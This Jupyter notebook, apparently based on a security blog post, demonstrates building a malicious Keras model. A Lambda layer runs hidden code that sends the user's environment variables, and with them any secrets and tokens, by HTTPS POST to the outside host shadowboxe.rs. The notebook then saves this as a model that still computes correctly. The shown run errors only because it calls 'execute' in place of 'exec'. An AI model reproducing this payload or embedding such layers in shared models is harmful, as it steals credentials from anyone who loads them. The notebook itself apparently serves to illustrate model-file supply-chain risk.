{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### On Malicious Models\n",
    "##### The contents are based on https://5stars217.github.io/2023-03-30-on-malicious-models/\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "from tensorflow import keras\n",
    "\n",
    "# Defining a lambda function called \"malicious_action\"\n",
    "# which sends the user's environment variables to an external website.\n",
    "# The exec() function always returns None, so combining it with Python’s or operator can return the input as-is.  \n",
    "malicious_action = lambda x: execute(\"\"\"\n",
    "import os\n",
    "import json\n",
    "import http.client\n",
    "\n",
    "# Connecting to an external website\n",
    "connection = http.client.HTTPSConnection(\"shadowboxe.rs\")\n",
    "\n",
    "# Sending a POST request to the website with the user's environment variables\n",
    "connection.request(\"POST\", f\"/{os.getlogin()}\", json.dumps(dict(os.environ)), {\"Content-Type\": \"application/json\"})\n",
    "\n",
    "# Printing the status of the response received from the website\n",
    "print(f\"Environment-variable exfiltration status: {connection.getresponse().status}\")\n",
    "\"\"\") or x\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# now a basic model, so you can see the math is unchanged:\n",
    "# Creating an input layer for the model with 5 nodes\n",
    "input_data = keras.Input(shape=(5,))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "Exception encountered when calling layer \"lambda_1\" (type Lambda).\n\nname 'execute' is not defined\n\nCall arguments received by layer \"lambda_1\" (type Lambda):\n  • inputs=tf.Tensor(shape=(None, 5), dtype=float32)\n  • mask=None\n  • training=None",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[5], line 2\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[38;5;66;03m# Creating a Lambda layer which applies the malicious_action function to the input data\u001b[39;00m\n\u001b[0;32m----> 2\u001b[0m output_data \u001b[38;5;241m=\u001b[39m \u001b[43mkeras\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mlayers\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mLambda\u001b[49m\u001b[43m(\u001b[49m\u001b[43mmalicious_action\u001b[49m\u001b[43m)\u001b[49m\u001b[43m(\u001b[49m\u001b[43minput_data\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/anaconda3/envs/safe_pickle/lib/python3.10/site-packages/keras/src/utils/traceback_utils.py:70\u001b[0m, in \u001b[0;36mfilter_traceback.<locals>.error_handler\u001b[0;34m(*args, **kwargs)\u001b[0m\n\u001b[1;32m     67\u001b[0m     filtered_tb \u001b[38;5;241m=\u001b[39m _process_traceback_frames(e\u001b[38;5;241m.\u001b[39m__traceback__)\n\u001b[1;32m     68\u001b[0m     \u001b[38;5;66;03m# To get the full stack trace, call:\u001b[39;00m\n\u001b[1;32m     69\u001b[0m     \u001b[38;5;66;03m# `tf.debugging.disable_traceback_filtering()`\u001b[39;00m\n\u001b[0;32m---> 70\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m e\u001b[38;5;241m.\u001b[39mwith_traceback(filtered_tb) \u001b[38;5;28;01mfrom\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m\n\u001b[1;32m     71\u001b[0m \u001b[38;5;28;01mfinally\u001b[39;00m:\n\u001b[1;32m     72\u001b[0m     \u001b[38;5;28;01mdel\u001b[39;00m filtered_tb\n",
      "Cell \u001b[0;32mIn[3], line 6\u001b[0m, in \u001b[0;36m<lambda>\u001b[0;34m(x)\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[38;5;28;01mfrom\u001b[39;00m \u001b[38;5;21;01mtensorflow\u001b[39;00m \u001b[38;5;28;01mimport\u001b[39;00m keras\n\u001b[1;32m      3\u001b[0m \u001b[38;5;66;03m# Defining a lambda function called \"malicious_action\"\u001b[39;00m\n\u001b[1;32m      4\u001b[0m \u001b[38;5;66;03m# which sends the user's environment variables to an external website.\u001b[39;00m\n\u001b[1;32m      5\u001b[0m \u001b[38;5;66;03m# The exec() function always returns None, so combining it with Python’s or operator can return the input as-is.  \u001b[39;00m\n\u001b[0;32m----> 6\u001b[0m malicious_action \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;01mlambda\u001b[39;00m x: \u001b[43mexecute\u001b[49m(\u001b[38;5;124m\"\"\"\u001b[39m\n\u001b[1;32m      7\u001b[0m \u001b[38;5;124mimport os\u001b[39m\n\u001b[1;32m      8\u001b[0m \u001b[38;5;124mimport json\u001b[39m\n\u001b[1;32m      9\u001b[0m \u001b[38;5;124mimport http.client\u001b[39m\n\u001b[1;32m     10\u001b[0m \n\u001b[1;32m     11\u001b[0m \u001b[38;5;124m# Connecting to an external website\u001b[39m\n\u001b[1;32m     12\u001b[0m \u001b[38;5;124mconnection = http.client.HTTPSConnection(\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mshadowboxe.rs\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m)\u001b[39m\n\u001b[1;32m     13\u001b[0m \n\u001b[1;32m     14\u001b[0m \u001b[38;5;124m# Sending a POST request to the website with the user\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;124ms environment variables\u001b[39m\n\u001b[1;32m     15\u001b[0m \u001b[38;5;124mconnection.request(\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mPOST\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m, f\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m/\u001b[39m\u001b[38;5;124m{\u001b[39m\u001b[38;5;124mos.getlogin()}\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m, json.dumps(dict(os.environ)), \u001b[39m\u001b[38;5;124m{\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mContent-Type\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m: \u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mapplication/json\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m})\u001b[39m\n\u001b[1;32m     16\u001b[0m \n\u001b[1;32m     17\u001b[0m \u001b[38;5;124m# Printing the status of the response received from the website\u001b[39m\n\u001b[1;32m     18\u001b[0m \u001b[38;5;124mprint(f\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mEnvironment-variable exfiltration status: \u001b[39m\u001b[38;5;124m{\u001b[39m\u001b[38;5;124mconnection.getresponse().status}\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m)\u001b[39m\n\u001b[1;32m     19\u001b[0m \u001b[38;5;124m\"\"\"\u001b[39m) \u001b[38;5;129;01mor\u001b[39;00m x\n",
      "\u001b[0;31mNameError\u001b[0m: Exception encountered when calling layer \"lambda_1\" (type Lambda).\n\nname 'execute' is not defined\n\nCall arguments received by layer \"lambda_1\" (type Lambda):\n  • inputs=tf.Tensor(shape=(None, 5), dtype=float32)\n  • mask=None\n  • training=None"
     ]
    }
   ],
   "source": [
    "\n",
    "# Creating a Lambda layer which applies the malicious_action function to the input data\n",
    "output_data = keras.layers.Lambda(malicious_action)(input_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "# Creating a model which takes the input layer and applies the Lambda layer to it\n",
    "malicious_model = keras.Model(input_data, output_data)\n",
    "\n",
    "# Compiling the model with an optimizer and loss function\n",
    "malicious_model.compile(optimizer=\"adam\", loss=\"mean_squared_error\")\n",
    "\n",
    "# Saving the model as a file named \"malicious_model_saved\". It still does correct math.\n",
    "malicious_model.save(\"malicious_model_saved\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "safe_pickle",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
